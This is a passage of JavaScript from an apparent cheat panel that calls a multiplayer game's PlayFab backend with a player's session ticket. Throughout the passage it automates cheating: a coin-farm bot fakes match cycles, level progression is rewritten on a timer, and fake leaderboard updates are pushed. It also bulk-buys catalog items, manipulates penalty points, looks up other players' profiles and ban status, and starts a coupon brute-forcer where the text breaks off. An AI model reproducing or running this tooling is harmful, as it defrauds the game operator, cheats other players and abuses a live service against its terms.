          logIOSAction("Modified Progression", { modifiedProgression: currentLevelProgression, platformName });

          output.textContent += `üîÑ Updating leaderboard (Platform: ${platformName})...\n`;
          const updateData = await makeApiCall(
            "Client/ExecuteCloudScript",
            "POST",
            {
              CustomTags: null,
              FunctionName: "refreshLeaderboardPlatform",
              FunctionParameter: {
                currentLevelProgression: JSON.stringify(currentLevelProgression),
                platformName: platformName
              },
              GeneratePlayStreamEvent: true,
              RevisionSelection: null,
              SpecificRevision: null,
              AuthenticationContext: null
            },
            titleIdIOS,
            sessionTicketIOS
          );

          if (updateData.error) {
            output.textContent += `‚ùå Failed to update leaderboard: ${updateData.error}\n`;
            logIOSAction("Leaderboard Update Failed", { error: updateData.error, platformName });
            output.style.color = "red";
          } else {
            output.textContent += `‚úÖ Leaderboard updated successfully!\n${formatResponse(updateData.data)}\n`;
            logIOSAction("Leaderboard Update Success", { result: updateData.data, platformName });
            output.style.color = "green";
          }
        } catch (error) {
          output.textContent += `‚ùå Unexpected error: ${error.message}\n`;
          logIOSAction("Unexpected Error", { error: error.message, platformName });
          output.style.color = "red";
        }
        output.scrollTop = output.scrollHeight;
      }

      runIOSAutomationCycle();
      iosAutomationIntervalId = setInterval(runIOSAutomationCycle, 1000);
    }

    async function viewIOSLeaderboard() {
      const output = document.getElementById("iosOutput");
      const statisticName = document.getElementById("iosStatisticName").value.trim();
      const startPosition = parseInt(document.getElementById("iosStartPosition").value) || 0;
      const maxResults = parseInt(document.getElementById("iosMaxResults").value) || 100;

      if (!sessionTicketIOS) {
        output.textContent = "‚ùå Please set your IOS SessionTicket first.\n";
        output.style.color = "red";
        return;
      }

      if (!statisticName) {
        output.textContent = "‚ùå Please enter a statistic name.\n";
        output.style.color = "red";
        return;
      }

      output.textContent = "Fetching IOS leaderboard...\n";
      try {
        const data = await makeApiCall("Client/GetLeaderboard", "POST", {
          StatisticName: statisticName,
          StartPosition: startPosition,
          MaxResultsCount: maxResults
        }, titleIdIOS, sessionTicketIOS);

        if (data.data && data.data.Leaderboard) {
          let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
          data.data.Leaderboard.forEach((entry, index) => {
            leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName || "Unknown"}: ${entry.StatValue}\n`;
          });
          output.textContent = leaderboardText;
        } else if (data.error) {
          output.textContent = `‚ùå Error: ${data.error}\n`;
          output.style.color = "red";
        } else {
          output.textContent = "No leaderboard data found.\n";
        }
      } catch (error) {
        output.textContent = `‚ùå Unexpected error: ${error.message}\n`;
        output.style.color = "red";
      }
      output.scrollTop = output.scrollHeight;
    }

    async function purchaseAllSkinsEmotes() {
      const output = document.getElementById("purchaseAllOutput");
      output.textContent = "Starting purchase process (ensure Steam is closed)...\n";

      if (!sessionTicket) {
        output.textContent += "‚ùå Please set your SessionTicket first.\n";
        return;
      }

      try {
        output.textContent += "üìã Fetching catalog items...\n";
        const catalogData = await makeApiCall("Client/GetCatalogItems", "POST", {
          CatalogVersion: "Ingame"
        }, titleIdMain, sessionTicket);

        if (catalogData.error) {
          output.textContent += `‚ùå Failed to get catalog: ${catalogData.error}\n`;
          return;
        }

        const catalogItems = catalogData.data.Catalog;
        output.textContent += `‚úÖ Found ${catalogItems.length} items in catalog\n`;

        output.textContent += "üì¶ Checking current inventory...\n";
        const inventoryData = await makeApiCall("Client/GetUserInventory", "POST", {}, titleIdMain, sessionTicket);

        if (inventoryData.error) {
          output.textContent += `‚ùå Failed to get inventory: ${inventoryData.error}\n`;
          return;
        }

        const ownedItems = inventoryData.data.Inventory.map(item => item.ItemId);
        output.textContent += `‚úÖ You own ${ownedItems.length} items\n`;

        const itemsToPurchase = [];
        const blacklistYears = ["2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025"];
        const blacklistItems = ["PS4", "Devil", "Neighbor_HEAD_Spy", "Cheater_Token"];

        for (const item of catalogItems) {
          if (ownedItems.includes(item.ItemId)) {
            output.textContent += `‚è© Skipping ${item.ItemId} (already owned)\n`;
            continue;
          }

          const itemName = item.ItemId.toLowerCase();
          const isBlacklistedYear = blacklistYears.some(year => itemName.includes(year.toLowerCase()));
          const isBlacklistedItem = blacklistItems.some(keyword => itemName.includes(keyword.toLowerCase()));

          if (isBlacklistedYear || isBlacklistedItem) {
            output.textContent += `‚è© Skipping ${item.ItemId} (blacklisted)\n`;
            continue;
          }

          if (item.VirtualCurrencyPrices) {
            const currencies = Object.keys(item.VirtualCurrencyPrices);
            const selectedCurrency = currencies.find(currency => ["FE", "AC", "XP", "RM"].includes(currency));

            if (selectedCurrency) {
              const price = item.VirtualCurrencyPrices[selectedCurrency];
              itemsToPurchase.push({
                ItemId: item.ItemId,
                Price: price,
                VirtualCurrency: selectedCurrency
              });
              output.textContent += `‚ûï Will attempt to purchase ${item.ItemId} for ${price} ${selectedCurrency}\n`;
            } else {
              output.textContent += `‚è© Skipping ${item.ItemId} (no acceptable currency)\n`;
            }
          } else {
            output.textContent += `‚è© Skipping ${item.ItemId} (no virtual currency price)\n`;
          }
        }

        output.textContent += `\nüõí Attempting to purchase ${itemsToPurchase.length} items (one at a time)...\n\n`;

        let successfulPurchases = 0;
        let failedPurchases = 0;

        for (const item of itemsToPurchase) {
          try {
            output.textContent += `üõçÔ∏è Attempting to purchase ${item.ItemId} for ${item.Price} ${item.VirtualCurrency}...\n`;

            if (item.VirtualCurrency === "RM") {
              output.textContent += `Starting purchase for ${item.ItemId}...\n`;
              const startData = await makeApiCall("Client/StartPurchase", "POST", {
                StoreId: "steam_Shop_Currency",
                Items: [{
                  ItemId: item.ItemId,
                  Quantity: 1
                }]
              }, titleIdMain, sessionTicket);

              if (startData.error || !startData.data?.OrderId) {
                output.textContent += `‚ùå Error in StartPurchase: ${startData.error || "No OrderId returned"}\n`;
                failedPurchases++;
                continue;
              }

              const orderId = startData.data.OrderId;
              output.textContent += `Order ID: ${orderId}\nPaying for purchase...\n`;
              const payData = await makeApiCall("Client/PayForPurchase", "POST", {
                OrderId: orderId,
                Currency: "RM",
                ProviderName: "Steam"
              }, titleIdMain, sessionTicket);

              if (payData.error || !payData.data?.PaymentProviderTransactionId) {
                output.textContent += `‚ùå Error in PayForPurchase: ${payData.error || "Payment failed"}\n`;
                failedPurchases++;
                continue;
              }

              output.textContent += `Confirming purchase for ${item.ItemId}...\n`;
              const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
                OrderId: orderId
              }, titleIdMain, sessionTicket);

              if (confirmData.error) {
                output.textContent += `‚ùå Error in ConfirmPurchase: ${confirmData.error}\n`;
                failedPurchases++;
              } else {
                output.textContent += `‚úÖ Success! Purchased ${item.ItemId}\n`;
                successfulPurchases++;
              }
            } else {
              const purchaseData = await makeApiCall("Client/PurchaseItem", "POST", {
                ItemId: item.ItemId,
                Price: item.Price,
                VirtualCurrency: item.VirtualCurrency
              }, titleIdMain, sessionTicket);

              if (purchaseData.error) {
                output.textContent += `‚ùå Failed: ${purchaseData.errorMessage || purchaseData.error}\n`;
                failedPurchases++;
              } else {
                output.textContent += `‚úÖ Success! Purchased ${item.ItemId}\n`;
                successfulPurchases++;
              }
            }
          } catch (err) {
            output.textContent += `‚ùå Error purchasing ${item.ItemId}: ${err.message}\n`;
            failedPurchases++;
          }

          output.scrollTop = output.scrollHeight;
          await new Promise(resolve => setTimeout(resolve, 0));
        }

        output.textContent += `\nüéâ Purchase process completed!\n`;
        output.textContent += `‚úÖ Successful: ${successfulPurchases}\n`;
        output.textContent += `‚ùå Failed: ${failedPurchases}\n`;

      } catch (error) {
        output.textContent += `‚ùå Unexpected error: ${error.message}\n`;
      }

      output.scrollTop = output.scrollHeight;
    }

    async function viewInventory() {
      const output = document.getElementById("inventoryOutput");
      output.textContent = "Fetching inventory...\n";

      const data = await makeApiCall("Client/GetUserInventory", "POST", {}, titleIdMain, sessionTicket);

      if (data && data.data) {
        if (data.data.Inventory && data.data.Inventory.length > 0) {
          output.textContent = "=== Inventory ===\n";
          data.data.Inventory.forEach(item => {
            output.textContent += `Item ID: ${item.ItemId}\n`;
            output.textContent += `Item Instance ID: ${item.ItemInstanceId}\n`;
            output.textContent += `Item Class: ${item.ItemClass || "N/A"}\n`;
            output.textContent += `Remaining Uses: ${item.RemainingUses || "N/A"}\n`;
            output.textContent += `Custom Data: ${JSON.stringify(item.CustomData, null, 2) || "None"}\n`;
            output.textContent += "--------------------\n";
          });
          output.textContent += `Virtual Currency: ${JSON.stringify(data.data.VirtualCurrency, null, 2) || "None"}\n`;
        } else {
          output.textContent = "No items in inventory.";
        }
      } else {
        output.textContent = `Error: ${data.error || "Unknown error"}`;
      }
      output.scrollTop = output.scrollHeight;
    }

    async function addFriend() {
      const friendPlayFabId = document.getElementById("friendPlayFabId").value.trim();

      if (!friendPlayFabId) {
        document.getElementById("apiOutput").textContent = "Please enter a friend's PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/AddFriend", "POST", {
        FriendPlayFabId: friendPlayFabId
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function getFriendsList() {
      const data = await makeApiCall("Client/GetFriendsList", "POST", {
        IncludeSteamFriends: false,
        IncludeFacebookFriends: false
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("apiOutput");

      if (data.data && data.data.Friends) {
        let friendsList = "Friends List:\n";
        data.data.Friends.forEach(friend => {
          const steamId = friend.SteamInfo?.SteamId ? 
            `https://steamcommunity.com/profiles/${friend.SteamInfo.SteamId}` : "N/A";
          friendsList += `- ${friend.TitleDisplayName || "Unknown"} (${friend.FriendPlayFabId})\n  Steam Profile: ${steamId}\n`;
        });
        output.textContent = friendsList;
      } else if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = "No friends found.";
      }
    }

    async function updateDisplayName() {
      const displayName = document.getElementById("displayName").value.trim();

      if (!displayName) {
        document.getElementById("apiOutput").textContent = "Please enter a display name.";
        return;
      }

      const data = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
        DisplayName: displayName
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function linkCustomId() {
      const customId = document.getElementById("customId").value.trim();

      if (!customId) {
        document.getElementById("apiOutput").textContent = "Please enter a custom ID.";
        return;
      }

      const data = await makeApiCall("Client/LinkCustomID", "POST", {
        CustomId: customId,
        ForceLink: false
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function getLeaderboard() {
      const statisticName = document.getElementById("statisticName").value.trim();
      const startPosition = parseInt(document.getElementById("startPosition").value) || 0;
      const maxResults = parseInt(document.getElementById("maxResults").value) || 100;

      if (!statisticName) {
        document.getElementById("apiOutput").textContent = "Please enter a statistic name.";
        return;
      }

      const data = await makeApiCall("Client/GetLeaderboard", "POST", {
        StatisticName: statisticName,
        StartPosition: startPosition,
        MaxResultsCount: maxResults
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("apiOutput");

      if (data.data && data.data.Leaderboard) {
        let leaderboardText = `Leaderboard for ${statisticName}:\n\n`;
        data.data.Leaderboard.forEach((entry, index) => {
          leaderboardText += `${startPosition + index + 1}. ${entry.DisplayName || "Unknown"}: ${entry.StatValue}\n`;
        });
        output.textContent = leaderboardText;
      } else if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data);
      }
    }

    async function reportPlayer() {
      const reportReason = document.getElementById("reportReason").value;
      const targetPlayerId = document.getElementById("targetPlayerId").value.trim();

      if (!targetPlayerId) {
        document.getElementById("apiOutput").textContent = "Please enter a target PlayFab ID.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "reportPlayer",
        FunctionParameter: {
          reportReason: reportReason,
          targetPlayerId: targetPlayerId
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("apiOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function buySkinEmote() {
      const ItemId = document.getElementById("itemId").value.trim();
      const Price = parseInt(document.getElementById("price").value);
      const VirtualCurrency = document.getElementById("currency").value.trim();

      if (!ItemId || isNaN(Price) || !VirtualCurrency) {
        document.getElementById("purchaseOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/PurchaseItem", "POST", {
        ItemId,
        Price,
        VirtualCurrency
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("purchaseOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function grantCoupons() {
      const output = document.getElementById("couponOutput");
      output.textContent = "Starting coupon grant process...";

      try {
        output.textContent += "\nStarting purchase...";
        const startData = await makeApiCall("Client/StartPurchase", "POST", {
          StoreId: "steam_Shop_Currency",
          Items: [{
            ItemId: "Currency_Bundle_PileOfCoupons",
            Quantity: 1
          }]
        }, titleIdMain, sessionTicket);

        if (startData.error) {
          output.textContent += `\nError in StartPurchase: ${startData.error}`;
          return;
        }

        const orderId = startData.data?.OrderId;
        if (!orderId) {
          output.textContent += "\nStartPurchase failed. No OrderId returned.";
          return;
        }

        output.textContent += `\nOrder ID: ${orderId}`;

        output.textContent += "\nPaying for purchase...";
        const payData = await makeApiCall("Client/PayForPurchase", "POST", {
          OrderId: orderId,
          Currency: "RM",
          ProviderName: "Steam"
        }, titleIdMain, sessionTicket);

        if (payData.error || !payData.data?.PaymentProviderTransactionId) {
          output.textContent += `\nError in PayForPurchase: ${payData.error || "Payment failed"}\n`;
          return;
        }

        output.textContent += "\nConfirming purchase...";
        const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
          OrderId: orderId
        }, titleIdMain, sessionTicket);

        if (confirmData.error) {
          output.textContent += `\nError in ConfirmPurchase: ${confirmData.error}`;
        } else {
          output.textContent += "\nCoupon process completed:\n" + 
            formatResponse(confirmData.data);
        }
      } catch (error) {
        output.textContent += `\nUnexpected error: ${error.message}`;
      }
      output.scrollTop = output.scrollHeight;
    }

    async function viewStatistics() {
      const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {}, titleIdMain, sessionTicket);
      const output = document.getElementById("statsOutput");

      if (data.data?.Statistics) {
        const stats = data.data.Statistics.map(stat => 
          `${stat.StatisticName}: ${stat.Value}`
        ).join("\n");
        output.textContent = stats || "No statistics found.";
      } else {
        output.textContent = "Error retrieving statistics: " + 
          (data.error || "Unknown error");
      }
    }

    async function AddCoin() {
      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "usefulDeed",
        FunctionParameter: {},
        GeneratePlayStreamEvent: true
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("usefulDeedOutput");
      if (data.data?.FunctionName) {
        output.textContent = `‚úÖ usefulDeed executed successfully\nExecution Time: ${data.data.ExecutionTimeSeconds}s\nMemory Used: ${data.data.MemoryConsumedBytes} bytes\nAPI Requests: ${data.data.APIRequestsIssued}`;
      } else {
        output.textContent = "Error: " + (data.error || "Unknown error");
      }
    }

    async function submitLevelProgression() {
      const classId = document.getElementById("classIdInput").value.trim();
      const receivedXP = parseInt(document.getElementById("receivedXPInput").value) || 0;
      const jsonInput = document.getElementById("levelProgressionJson").value.trim();

      let currentLevelProgression;

      if (jsonInput) {
        try {
          currentLevelProgression = JSON.parse(jsonInput);
        } catch (e) {
          return { error: "Invalid JSON in level progression field." };
        }
      } else {
        const XP = parseInt(document.getElementById("xpInput").value);
        const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
        const level = parseInt(document.getElementById("levelInput").value);
        const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
        const playerLevel = parseInt(document.getElementById("playerLevelInput").value);

        if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
            isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
          return { error: "Please fill in all fields correctly or provide JSON." };
        }

        currentLevelProgression = {
          playerLevel,
          classLevel: [{
            classId,
            XP,
            XpToNextLevel,
            level,
            availablePerkSlotsCount
          }]
        };
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "setLevelProgressionForClass",
        FunctionParameter: {
          classId: classId || "All",
          receivedXP,
          currentLevelProgression: JSON.stringify(currentLevelProgression)
        },
        GeneratePlayStreamEvent: true
      }, titleIdMain, sessionTicket);

      return data;
    }

    async function getPlayFabInfo() {
      const playfabId = document.getElementById("playfabId").value.trim();
      const output = document.getElementById("playfabInfoOutput");

      if (!playfabId) {
        output.textContent = "Please enter a PlayFab ID.";
        return;
      }

      output.textContent = "Fetching data...";

      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
        PlayFabId: playfabId,
        InfoRequestParameters: {
          GetUserAccountInfo: true,
          GetPlayerStatistics: true,
          GetUserInventory: true
        }
      }, titleIdMain, sessionTicket);

      const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
        PlayFabId: playfabId,
        ProfileConstraints: {
          ShowLastLogin: true,
          ShowBannedUntil: true
        }
      }, titleIdMain, sessionTicket);

      let resultText = "";

      if (combinedData.data) {
        const info = combinedData.data.InfoResultPayload;
        resultText += "=== ACCOUNT INFO ===\n";
        resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
        resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
        resultText += "\n=== STATISTICS ===\n";

        if (info.PlayerStatistics) {
          info.PlayerStatistics.forEach(stat => {
            resultText += `${stat.StatisticName}: ${stat.Value}\n`;
          });
        }
      }

      if (profileData.data) {
        const profile = profileData.data.PlayerProfile;
        resultText += "\n=== PROFILE INFO ===\n";
        resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
        resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
      }

      if (combinedData.error || profileData.error) {
        resultText += "\n=== ERRORS ===\n";
        if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
        if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
      }

      output.textContent = resultText || "No data received.";
    }

    async function updateQuestProgress() {
      const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
      const progressValue = parseInt(document.getElementById("questProgressValue").value);

      if (!questTextFieldId || isNaN(progressValue)) {
        document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "updateActiveQuests",
        FunctionParameter: {
          updatedValues: `{"${questTextFieldId}":${progressValue}}`
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      const output = document.getElementById("questOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function increasePenaltyPoints() {
      const output = document.getElementById("penaltyOutput");
      output.textContent = "Increasing penalty points...\n";

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "increaseLowPriorityMatches",
        FunctionParameter: {
          reason: "LEAVE_MATCH"
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      if (data.error) {
        output.textContent += `‚ùå Error: ${data.error}\n`;
      } else {
        output.textContent += `‚úÖ Penalty points increased successfully\n`;
        output.textContent += formatResponse(data.data);
      }
      output.scrollTop = output.scrollHeight;
    }

    async function decreasePenaltyPoints() {
      const output = document.getElementById("penaltyOutput");
      output.textContent = "Decreasing penalty points...\n";

      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "refreshStartPunishmentLevelTime",
        FunctionParameter: null,
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "getXpMultiplier",
        FunctionParameter: {
          playerCount: 0
        },
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "checkPopCornEvent",
        FunctionParameter: null,
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `‚ùå Error: ${refreshData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `‚ùå Error: ${xpMultiplierData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `checkPopCornEvent: ${popCornData.error ? `‚ùå Error: ${popCornData.error}` : "‚úÖ Success"}\n`;
      output.scrollTop = output.scrollHeight;
    }

    async function startMatchStatusSequence() {
      const playerId = document.getElementById("matchPlayerId").value.trim();
      const output = document.getElementById("penaltyOutput");

      if (!playerId) {
        output.textContent = "Please enter a Player ID for match status.\n";
        return;
      }

      output.textContent = "Starting match status sequence...\n";

      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "refreshStartPunishmentLevelTime",
        FunctionParameter: null,
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "getXpMultiplier",
        FunctionParameter: {
          playerCount: 0
        },
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "checkPopCornEvent",
        FunctionParameter: null,
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      }, titleIdMain, sessionTicket);

      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `‚ùå Error: ${refreshData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `‚ùå Error: ${xpMultiplierData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `checkPopCornEvent: ${popCornData.error ? `‚ùå Error: ${popCornData.error}` : "‚úÖ Success"}\n`;
      output.textContent += "Waiting 10 minutes to update match status...\n";
      output.scrollTop = output.scrollHeight;

      setTimeout(async () => {
        const matchData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          CustomTags: null,
          FunctionName: "changeMatchPlayerStatus",
          FunctionParameter: {
            playerId: playerId,
            matchId: "",
            newStatus: "FINISHED"
          },
          GeneratePlayStreamEvent: true,
          RevisionSelection: null,
          SpecificRevision: null,
          AuthenticationContext: null
        }, titleIdMain, sessionTicket);

        output.textContent += `changeMatchPlayerStatus: ${matchData.error ? `‚ùå Error: ${matchData.error}` : "‚úÖ Success"}\n`;
        output.scrollTop = output.scrollHeight;
      }, 10 * 60 * 1000);
    }

  <script>
  async function toggleCoinFarmBot() {
    const cloudOutput = document.getElementById("cloudOutput");
    if (coinFarmBotRunning) {
      clearInterval(coinFarmIntervalId);
      coinFarmBotRunning = false;
      document.getElementById("botStatus").className = "status-indicator status-inactive";
      document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";
      cloudOutput.textContent += "\n=== Coin Farm Bot Stopped ===\n";
      cloudOutput.textContent += `Bot stopped at ${new Date().toLocaleTimeString()}\n`;
      cloudOutput.textContent += `Total Coins Earned: ${totalCoinsEarned}\n`;
      if (lastCoinFarmResponse) {
        cloudOutput.textContent += `Last Response:\n${formatResponse(lastCoinFarmResponse)}\n`;
      } else {
        cloudOutput.textContent += "No response data available.\n";
      }
      cloudOutput.scrollTop = cloudOutput.scrollHeight;
      totalCoinsEarned = 0; // Reset coin counter
      return;
    }

    const delayMinutes = parseInt(document.getElementById("delaySelect").value);
    const delayMs = delayMinutes * 60 * 1000;

    coinFarmBotRunning = true;
    document.getElementById("botStatus").className = "status-indicator status-active";
    document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";

    cloudOutput.textContent = `Starting Coin Farm Bot with ${delayMinutes} minute delay...\n`;

    async function runCoinFarmCycle() {
      const roomType = document.getElementById("roomType").value;
      const playerIds = [
        document.getElementById("playerId1").value.trim(),
        document.getElementById("playerId2").value.trim(),
        document.getElementById("playerId3").value.trim(),
        document.getElementById("playerId4").value.trim(),
        document.getElementById("playerId5").value.trim(),
        document.getElementById("playerId6").value.trim()
      ].filter(id => id);

      let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()} ===\n`;
      output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;

      let matchId = null;

      try {
        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          FunctionName: "startNewMatch",
          FunctionParameter: { roomType, playerIds },
          GeneratePlayStreamEvent: true
        });

        if (data.error) {
          output += `‚ùå startNewMatch: Error - ${data.error}\n`;
        } else if (data.data?.FunctionResult?.currentMatchId) {
          matchId = data.data.FunctionResult.currentMatchId;
          output += `‚úÖ startNewMatch: MatchId - ${matchId}\n`;
          lastCoinFarmResponse = data.data;
        } else {
          output += `‚úÖ startNewMatch: Success\n`;
          lastCoinFarmResponse = data.data;
        }
      } catch (err) {
        output += `‚ùå startNewMatch: Exception - ${err.message}\n`;
      }

      try {
        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          FunctionName: "decideSpecialRole",
          FunctionParameter: { roomType, playerIds },
          GeneratePlayStreamEvent: true
        });

        if (data.error) {
          output += `‚ùå decideSpecialRole: Error - ${data.error}\n`;
        } else {
          output += `‚úÖ decideSpecialRole: Success\n`;
          lastCoinFarmResponse = data.data;
        }
      } catch (err) {
        output += `‚ùå decideSpecialRole: Exception - ${err.message}\n`;
      }

      if (matchId) {
        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            CustomTags: null,
            FunctionName: "xpConsumed",
            FunctionParameter: {
              token: matchId
            },
            GeneratePlayStreamEvent: true,
            RevisionSelection: null,
            SpecificRevision: null,
            AuthenticationContext: null
          });

          if (data.error) {
            output += `‚ùå xpConsumed: Error - ${data.error}\n`;
          } else {
            output += `‚úÖ xpConsumed: Success\n`;
            lastCoinFarmResponse = data.data;
          }
        } catch (err) {
          output += `‚ùå xpConsumed: Exception - ${err.message}\n`;
        }
      }

      try {
        const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          FunctionName: "finishMatch",
          FunctionParameter: { roomType, playerIds },
          GeneratePlayStreamEvent: true
        });

        if (data.error) {
          output += `‚ùå finishMatch: Error - ${data.error}\n`;
        } else {
          output += `‚úÖ finishMatch: Success\n`;
          lastCoinFarmResponse = data.data;
          let cycleCoins = 0;
          if (data.data?.Logs) {
            data.data.Logs.forEach(log => {
              const match = log.Message.match(/Coins granted: (\d+)/);
              if (match) {
                cycleCoins += parseInt(match[1], 10);
              }
            });
          }
          totalCoinsEarned += cycleCoins;
          output += `üí∞ Coins Earned This Cycle: ${cycleCoins}\n`;
        }
      } catch (err) {
        output += `‚ùå finishMatch: Exception - ${err.message}\n`;
      }

      cloudOutput.textContent += output;
      cloudOutput.scrollTop = cloudOutput.scrollHeight;
    }

    runCoinFarmCycle();
    coinFarmIntervalId = setInterval(runCoinFarmCycle, delayMs);
  }

  async function toggleLevelEditor() {
    if (levelEditorRunning) {
      clearInterval(levelEditorIntervalId);
      levelEditorRunning = false;
      document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
      document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
      document.getElementById("levelProgressionOutput").textContent += "\nLevel Editor stopped manually.";
      return;
    }

    levelEditorRunning = true;
    document.getElementById("levelEditorStatus").className = "status-indicator status-active";
    document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";

    document.getElementById("levelProgressionOutput").textContent = "Starting Level Editor...\n";

    async function runLevelEditorCycle() {
      const output = document.getElementById("levelProgressionOutput");
      const data = await submitLevelProgression();

      if (data.error) {
        output.textContent += `‚ùå Error: ${data.error}\n`;
      } else {
        output.textContent += `‚úÖ Level progression updated successfully\n${formatResponse(data.data)}\n`;
      }
      output.scrollTop = output.scrollHeight;
    }

    runLevelEditorCycle();
    levelEditorIntervalId = setInterval(runLevelEditorCycle, 5 * 60 * 1000); // 5-minute interval
  }

  async function toggleBruteforceRedeemCoupon() {
    const output = document.getElementById("apiOutput");

    if (couponBruteforceRunning) {
      clearInterval(couponBruteforceIntervalId);
      couponBruteforceRunning = false;
      document.getElementById("couponBruteforceStatus").className = "status-indicator status-inactive";
      document.getElementById("couponBruteforceToggleButton").textContent = "Start Bruteforce Redeem Coupon";
      output.textContent += "\nCoupon bruteforce stopped manually.";
      return;
    }

    couponBruteforceRunning = true;
    document.getElementById("couponBruteforceStatus").className = "status-indicator status-active";
